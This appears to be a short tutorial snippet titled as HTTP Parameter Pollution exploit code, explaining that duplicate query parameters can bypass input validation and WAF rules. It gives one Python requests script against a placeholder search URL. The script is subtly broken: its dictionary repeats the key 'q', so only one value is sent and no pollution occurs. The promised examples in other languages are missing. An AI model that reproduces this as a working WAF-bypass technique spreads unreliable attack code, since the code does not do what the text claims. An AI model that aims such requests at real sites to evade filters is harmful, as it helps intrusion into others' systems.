# HTTP Parameter Pollution (HPP) Exploit Code

HTTP Parameter Pollution (HPP) occurs when multiple parameters with the same name are sent in an HTTP request, which can sometimes bypass input validation and WAF rules. Here are examples in different languages:

## Python (using requests library)

```python
import requests

# Target URL with vulnerable parameter
url = "https://example.com/search"

# Normal request
params = {
    "q": "test"
}

# HPP attack - sending same parameter twice
params_hpp = {
    "q": ["test", "malicious"],
    "q": "malicious"
}

# Send the request
response = requests.get(url, params=params_hpp)
print(response.url)  # Check the constructed URL
print(response.text)  # Check the response
```

